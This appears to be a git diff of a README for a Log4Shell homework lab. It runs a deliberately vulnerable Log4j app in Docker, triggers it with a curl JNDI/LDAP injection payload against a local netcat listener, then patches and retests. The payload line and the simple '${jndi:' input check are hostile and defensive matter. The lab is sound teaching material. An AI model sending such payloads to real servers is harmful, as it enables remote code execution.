@@ -1,18 +1,93 @@
 # Log4Shell Homework
+---
 
-## Build and Run
+## Architecture Diagram
+
++--------------------------+                +-----------------------------+
+|  Docker Container:       |                |  Host Machine:              |
+|  Spring Boot Java App    |                |  Simulated Attacker         |
+|  (Log4j 2.14.1, /log)    |                |  (Netcat LDAP Server)       |
+|                          |                |                             |
+|  Exposes:                |                |  Listens on port 1389       |
+|  POST /log endpoint      |                |  nc -lvkp 1389              |
+|                          |                |                             |
+|  Receives POST data      |<----JNDI---->  |  Receives JNDI connection   |
+|  Logs with Log4j         |                |  from Java app              |
++--------------------------+                +-----------------------------+
+
+---
+
+## Setup Instructions
+
+### **Prerequisites**
+
+- Docker desktop
+- `nc` (Netcat),  pre-installed on Linux/WSL
+
+### **Clone the Repository**
+
+git clone git@github.com:Cybermun/log4shell.git
+cd log4shell
+
+---
+
+### **Build and Run the Application**
+
 docker-compose up --build
 
-## Simulated Attacker (separate terminal)
+The app will start and listen on http://localhost:8080.
+
+---
+
+### **Simulate the Attacker (LDAP Server) in a New Terminal**
+
 nc -lvkp 1389
 
-## Exploit test
+This listens for any outbound JNDI/LDAP connections.
+
+---
+
+### **Exploit Test**
+
+In another terminal, run:
+
 curl -H 'Content-Type: text/plain' --data '${jndi:ldap://host.docker.internal:1389/a}' http://localhost:8080/log
 
-## Defense
-- Upgrade Log4j in pom.xml to 2.17.0
-- Add input validation in LogController.java
+**If vulnerable,** you will see a connection in your nc terminal.
 
-## Retest exploit
-- Repeat curl (should be blocked)
-- Try safe input: "Hello World"
+---
+
+## Patch and Mitigation
+
+- Upgrade Log4j in pom.xml to 2.17.0
+- Add input validation in LogController.java:
+
+if (input.contains("${jndi:")) {
+    return "Invalid input detected";
+}
+
+---
+
+### **Rebuild and Redeploy After Patching**
+
+docker-compose down
+docker-compose up --build
+
+---
+
+### **Retest Exploit**
+
+Repeat the curl command above.
+**Expected:** No connection is made to Netcat, and the app returns Invalid input detected.
+
+---
+
+### **Test Normal Input**
+
+curl -H 'Content-Type: text/plain' --data 'Hello World' http://localhost:8080/log
+
+**Expected:** Returns Logged: Hello World.
+
+---
+
+This project is for educational purposes only.
